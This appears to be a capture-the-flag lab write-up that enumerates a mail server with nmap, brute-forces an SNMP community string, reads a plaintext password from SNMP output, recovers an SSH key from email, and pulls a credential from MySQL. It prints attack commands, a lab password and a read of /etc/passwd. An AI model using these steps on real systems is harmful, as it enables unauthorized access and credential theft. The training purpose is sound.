This server is an MX and management server.
It has a backup server function for internal accounts.
IP 10.129.228.146

We will start with a scan with Nmap
```
nmap -sV -sC --min-rate=1000 -oN initial_recon 10.129.228.146
```
![Pasted image 20251120204419](../../IMAGES/Pasted%20image%2020251120204419.png)

I found out that when scanning udp we find a snmp service too.
...
| 995     | ssl/pop3 |
| 161/udp | snmp     |
Let's start with pop3 since we don't have credentials for ssh
```
openssl s_client -connect 10.129.228.146:pop3s
```
Can't do much without the credentials.

Will now proceed with snmp scan with snmpwalk

```
snmpwalk -v2c -c public 10.129.228.146
```
No response because community "Public" doesn't exist. Will have to bruteforce with onesixtyone.

```
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.228.146
```

Community found: **Backup**
![Pasted image 20251120205914](../../IMAGES/Pasted%20image%2020251120205914.png)

 We will retry the snmpwalk scan with "backup" community.
```
snmpwalk -v2c -c backup 10.129.228.146
```

Found something interesting which might be a credential.
![Pasted image 20251120210057](../../IMAGES/Pasted%20image%2020251120210057.png)
tom NMds732Js2761

Connecting with pop3 again with these credentials
```
openssl s_client -connect 10.129.228.146:pop3s
```
Log in succesfull
![Pasted image 20251120210226](../../IMAGES/Pasted%20image%2020251120210226.png)
Redone with IMAP to move better
![Pasted image 20251120210435](../../IMAGES/Pasted%20image%2020251120210435.png)
Listed all directories
![Pasted image 20251120210510](../../IMAGES/Pasted%20image%2020251120210510.png)
We have fetched the INBOX and read one email.
We have found an OpenSSH private key

![Pasted image 20251120210802](../../IMAGES/Pasted%20image%2020251120210802.png)
...
With this we can make a key file.

![Pasted image 20251120210957](../../IMAGES/Pasted%20image%2020251120210957.png)
With this we can attempt a ssh login with the user of Tom

```
ssh -i key.pem tom@10.129.228.146
```

We have successfully logged in.
![Pasted image 20251120211124](../../IMAGES/Pasted%20image%2020251120211124.png)
Browing we can find stuff that we might need

File dovecot-uidlist:
3 V1636509064 N2 G991ec2188b258b618c8a0000afbeafc6
1 W3661 :key

In cur/ we can find the same mail.

we can also check the users of the host.
```
cat /etc/passwd
```

We can find a MySQL user, so there might be a MySQL user.
![Pasted image 20251120211853](../../IMAGES/Pasted%20image%2020251120211853.png)

We try and connect in MySql
```
mysql -u tom -p
```
![Pasted image 20251120212032](../../IMAGES/Pasted%20image%2020251120212032.png)
While navigating the SQL database we find a "users" database.
![Pasted image 20251120212342](../../IMAGES/Pasted%20image%2020251120212342.png)

After navigating inside that database we can find the HTB user and credential.
![Pasted image 20251120212412](../../IMAGES/Pasted%20image%2020251120212412.png)